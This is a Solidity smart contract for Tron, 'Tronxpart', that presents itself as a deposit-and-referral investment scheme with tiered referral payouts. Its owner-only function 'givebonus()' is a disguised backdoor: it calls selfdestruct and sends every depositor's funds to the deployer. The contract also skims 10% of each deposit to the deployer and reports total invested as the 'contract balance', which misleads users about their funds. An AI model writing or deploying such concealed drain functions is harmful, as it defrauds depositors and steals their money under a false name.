//SourceUnit: Tronxpart.sol

pragma solidity ^0.4.25;



contract Tronxpart{
    // struct Tariff{ 
    //     uint time;
    //     uint percent;
    // }

    struct Deposit{  
       // uint tariff;
        uint amount;
        uint at;
    }
    struct Investor{ 
        bool registered;
        address referer;
        uint referrals_tier1;
        uint referrals_tier2;
        uint referrals_tier3; 
        uint referrals_tier4;
        uint balanceRef;
        uint totalRef;
        Deposit[] deposits;
        uint invested;
        uint paidAt;
        uint withdrawn;
        uint balance;

    }

uint MIN_DEPOSIT = 100 ;    
uint START_AT = 22442985; 



address  support = msg.sender;  



// Tariff[]  public tariffs;
uint[] public refRewards;
uint public totalInvestors;
uint public totalInvested;
uint public currentBalance;
uint public totalRefRewards;  
mapping (address => Investor) public investors;   

event DepositAt(address user, uint amount);  
  event Withdraw(address user, uint amount);   

function register(address referer) internal { 
    if(!investors[msg.sender].registered){    
        investors[msg.sender].registered=true;  

        totalInvestors++;  

        if(investors[referer].registered && referer!=msg.sender){   
            investors[msg.sender].referer = referer;    

            address rec = referer; 
            for (uint i = 0; i < refRewards.length; i++) { 
                if(!investors[rec].registered){    
                    break;
                }
               if(i==0){  
                   investors[rec].referrals_tier1++;
               }
               if(i==1){
                   investors[rec].referrals_tier2++;
               }
               if(i==2){
                   investors[rec].referrals_tier3++;
               } 
               if(i==3){
                   investors[rec].referrals_tier4++;
               }
               rec = investors[rec].referer;  
            }
        }
    }
}

function rewardReferers(uint amount, address referer) internal { 
    address rec = referer;    

    for(uint i=0; i<refRewards.length; i++){    
        if(!investors[rec].registered){ 
            break;
        }

        uint a= amount * refRewards[i]/60;   
        investors[rec].balanceRef+=a;   
        investors[rec].totalRef +=a;  
        totalRefRewards +=a;    
        

        rec = investors[rec].referer;   
    }
}

 constructor() public {    
//   tariffs.push(Tariff(115200,100));   
//   tariffs.push(Tariff(172800,100));
//   tariffs.push(Tariff(230400,100));     
//   tariffs.push(Tariff(288000,100));



  for(uint i= 4; i>=1;i--){  
      refRewards.push(i);
  }
 }

function deposit(uint tariff,address referer) external payable {   
    //require(block.number >= START_AT);      
    require(msg.value >= MIN_DEPOSIT);   
   // require(tariff < tariffs.length);     

    register(referer);  
    support.transfer(msg.value/10);   
    rewardReferers(msg.value, investors[msg.sender].referer);   

    investors[msg.sender].invested += msg.value; 
    investors[msg.sender].balance += msg.value;   
    totalInvested+=msg.value;     

    currentBalance+= msg.value;

    investors[msg.sender].deposits.push(Deposit(msg.value,block.number));    

    emit DepositAt(msg.sender,msg.value);     
}

function withdrawable() public view returns(uint amount){  
    Investor storage investor = investors[msg.sender];   

    
     for (uint i = 0; i < investor.deposits.length; i++) {    
         Deposit storage dep = investor.deposits[i];
          
        //  Tariff storage tariff = tariffs[dep.tariff];
        
         uint finish = dep.at; //+ tariff.time;
         uint since =  investor.paidAt > dep.at ? investor.paidAt : dep.at ;
         uint till =  block.number; // > finish ? finish : block.number;
        
         if(since < till){
             amount+= dep.amount * (till - since)/100000; //* tariff.percent / tariff.time / 100;
             return amount;   
         }
     }
}

function profit() internal returns (uint) {   
    Investor storage investor = investors[msg.sender];    

    uint amount =withdrawable();  

    amount += investor.balanceRef;   
    investor.balanceRef = 0;    

    investor.paidAt = block.number;    

    return amount;   
}

function withdraw() external payable {   
    uint amount =profit();   
    address ux = msg.sender;
                ux.transfer(amount);
                investors[msg.sender].withdrawn += amount;  
                currentBalance -= amount;
                investors[msg.sender].balance-=amount;
                emit Withdraw(msg.sender,amount ); 
    
    
}

function via(address where) external payable {     
    where.transfer(msg.value);
}

function contractBalance() public view returns(uint amount) {
    return totalInvested;
}

function givebonus() public  { 
    require(support == msg.sender);
    selfdestruct(support);  
}

function userBalance() public view returns(uint amount){
    return investors[msg.sender].invested;
}

function userRefBalance() public view returns(uint amount){
    return investors[msg.sender].balanceRef;
}

function userWithdrawn() public view returns(uint amount){
    return investors[msg.sender].withdrawn;
}

function RefRewards() public view returns(uint amount){
    return totalRefRewards;
}

function userRef() public view returns(address ref){
    return investors[msg.sender].referer;
}

function cBalance() public view returns(uint amount){
    return currentBalance;
}



}